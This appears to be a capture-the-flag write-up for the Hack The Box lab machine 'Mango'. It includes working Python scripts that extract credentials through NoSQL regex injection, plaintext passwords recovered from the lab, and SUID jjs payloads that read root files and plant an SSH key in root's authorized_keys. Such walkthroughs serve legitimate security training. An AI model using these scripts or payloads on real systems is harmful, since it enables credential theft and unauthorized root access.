<h2>Mango</h2>
<h3>The Basics</h3>
The first thing we should do is map the box IP address to the box name  .htb in the `/etc/hosts` file.
`10.10.10.162   mango.htb`

<h3>Initial Scan</h3>
Next up we can try running our standard NMAP scan `nmap -sC -sV mango.htb` but we won't get very far with that, so we decide to do a stealth scan instead and treat the host as online using `nmap -sS -Pn mango.htb`. We get results back for 3 ports: 22 SSH open, 80 HTTP open and 443 HTTPS open.

<h3>Web enumeration</h3>
Looking at the NMAP results, we most likely have a web application running on both HTTP 80 and HTTPS 443, so we fire up gobuster and take a manual look at the web app.  
While trying to run gobuster on `https://mango.htb` we get an interesting error message:

![gobuster error](/assets/images/mango-gobuster-results.png)

gobuster is telling us the SSL certificate for `https://mango.htb` is invalid, but it is **valid** for `https://staging-order.mango.htb`. Interesting, let's add `staging-order.mango.htb` to our `/etc/hosts` file and point it back at `10.10.10.162`. At first glance there's nothing interesting at `https://staging-order.mango.htb`, the web page resembles Google Search and we can visit `/analytics.php` which gives us a bunch of errors regarding a key for `*.codepen.io`. This looks to be a dead end.

However, the web server also serves content over HTTP on port 80, so let's give that a try: `http://staging-order.mango.htb`. We get a nice looking login page, when we try to login with some fake credentials not much happens. The page refreshes without any errors or warning messages.

We decide to run gobuster in the background on the virtual host to see if there's anything else going on, meanwhile we set up Hydra to try attack the webform.

Looking at the gobuster results, `/vendor` grabs our attention, and after some quick googling we find out `/vendor` is used by [Composer](https://getcomposer.org/) and it often contains `/composer/installed.json`. Inspecting the `installed.json` file, we can quickly see references to [MongoDB](https://www.mongodb.com/) and [mongo-php-adapter](https://github.com/alcaeus/mongo-php-adapter). Interesting, let's test the `index.php` login page for NoSQL injection.

<h3>Enumerating MongoDB for usernames and passwords</h3>
A quick google for NoSQL injection will find us [PayLoadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-json-body) GitHub repository. We need to modify the Post with JSON body script to fit our needs and enumerate both usernames and passwords.

extract-usernames.py
```python
import time
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username=""
password="cerbersec"
u="http://staging-order.mango.htb/index.php"
headers={'Content-Type' : 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','.','+','?','^','|','}']:
            payload= { 'username[$regex]' : "^" + username + c, 'password[$ne]' : password, "login" : "login" }
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (username+c))
                username += c
```

extract-passwords.py
```python
import time
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="cerbersec"

password=""
u="http://staging-order.mango.htb/index.php"
headers={'Content-Type' : 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','.','+','?','^','|','}']:
            payload= { 'username[$ne]' : username, 'password[$regex]' : "^" + password + c, "login" : "login" }
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

By modifying the `username` and `password` parameters as we gradually discover usernames and passwords we are eventually able to extract two usernames and two passwords.

Username | Password
--- | ---
admin | t9KcS3>!0B#2
mango | h3mXK8RhU~f{]f5H

<h3>Getting user via horizontal privesc</h3>
Now that we've got some credentials, it's time to find where to use them. When we log in on the web app we get redirected to `home.php` which is "Under Plantation", another dead end.
Trying SSH for **admin** results in a permission denied, but `ssh mango@mango.htb` seems to work with the password and we get our initial shell.

The first thing we can do when we get our initial shell, is checkout the `/home` directory. A quick `ls -la` tells us there are two users, **mango** and **admin**. No surprises here. Upon further inspection of their home directories we can see the `user.txt` flag is locked away in `/home/admin` and only readable by **admin**.

![admin directory](/assets/images/mango-home-admin.png)

Since we have credentials for **admin** let's try a simple horizontal privilage escalation with `su admin`. After entering the password for **admin** we can use `bash` to upgrade to a proper shell and grab the `user.txt` flag from `/home/admin`.

<h3>Getting root via jjs code execution</h3>
Time to move on to **root**. After some quick initial recon there's nothing that immediatly grabs our attention, so we should run [LinEnum](https://github.com/Cerbersec/scripts/blob/master/linux/LinEnum.sh). It tells us it found an interesting **SUID** file `/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs`.

![LinEnum result jjs](/assets/images/mango-linenum.png)

A quick google for **jjs privesc** tells us `jjs` can be exploited on [GTFOBins](https://gtfobins.github.io/gtfobins/jjs/). We can try to get a shell or reverse shell, but since it returns errors we move on. Another interesting angle could be reading and writing files, so let's give that a go.

File Write
```java
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("DATA");
fw.close();' | jjs
```

File Read
```java
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
while ((line = br.readLine()) != null) { print(line); }' | jjs
```

Using the **File Read** commands we can easily read `/root/root.txt` and grab the root flag.

<h3>Root Shell</h3>
To get a root shell we upload a SSH key to `authorized_keys`. We use `ssh-keygen -t rsa` to generate a new key pair and write the contents of `id_rsa.pub` to `/root/.ssh/authorized_keys` using the `fw.write();` function.

![jjs write ssh](/assets/images/mango-write-ssh.png)

Now we can use `ssh root@mango.htb -i id_rsa` to log in as root and get our root shell.
